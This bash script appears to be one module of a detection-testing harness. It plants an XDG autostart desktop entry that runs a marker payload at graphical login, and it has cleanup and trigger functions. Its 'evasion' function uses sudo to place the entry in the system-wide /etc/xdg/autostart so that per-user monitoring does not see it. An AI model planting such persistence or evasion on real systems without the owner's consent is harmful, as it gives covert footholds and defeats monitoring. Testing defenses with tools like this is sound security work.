#!/usr/bin/env bash
# Implant 5 — XDG autostart.
# Persistence: a .desktop file in ~/.config/autostart/ that the desktop
# session's autostart mechanism launches at graphical login.
# MITRE ATT&CK: T1547.013 (Boot or Logon Autostart Execution: XDG Autostart).
PD_TECH="xdg_autostart"
source "$(dirname "$(readlink -f "$0")")/lib.sh"

AUTOSTART_DIR="$HOME/.config/autostart"
DESKTOP_FILE="$AUTOSTART_DIR/pd-persist.desktop"
# System-wide autostart dir. A per-user watch on ~/.config/autostart/ never
# sees a file dropped here, but XDG autostart reads both locations.
EVADE_DIR="/etc/xdg/autostart"
EVADE_FILE="$EVADE_DIR/pd-persist.desktop"

do_paths() { echo "$DESKTOP_FILE"; }

_desktop_body() {
  cat <<EOF
[Desktop Entry]
Type=Application
Name=${PD_TAG} ${PD_TECH} (harmless marker)
Comment=${PD_TAG} ${PD_TECH}
Exec=$(pd_payload_cmd)
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
}

do_plant() {
  mkdir -p "$AUTOSTART_DIR"
  _desktop_body > "$DESKTOP_FILE"
  pd_info "planted: runs at next graphical login"
}

do_cleanup() {
  rm -f "$DESKTOP_FILE"
  if [ -e "$EVADE_FILE" ]; then
    pd_backup "$EVADE_FILE" "sudo" >/dev/null 2>&1 || true
    sudo rm -f "$EVADE_FILE" 2>/dev/null || true
  fi
  pd_info "cleaned up"
}

# No headless trigger exists: XDG autostart only fires through a real desktop
# session login (see docs/VM_SETUP.md — Desktop ISO, not Server). `verify`
# after a graphical login is the real check; `trigger` falls back to running
# the payload directly as a smoke test of the command itself.
do_trigger() { pd_trigger_default; }

# Evasion: drop the .desktop file in the system-wide autostart directory
# instead of the per-user one (needs root).
do_evade() {
  sudo mkdir -p "$EVADE_DIR"
  _desktop_body | sudo tee "$EVADE_FILE" >/dev/null
  pd_info "evasion planted in $EVADE_FILE (system-wide, not per-user autostart)"
}

pd_main "$@"
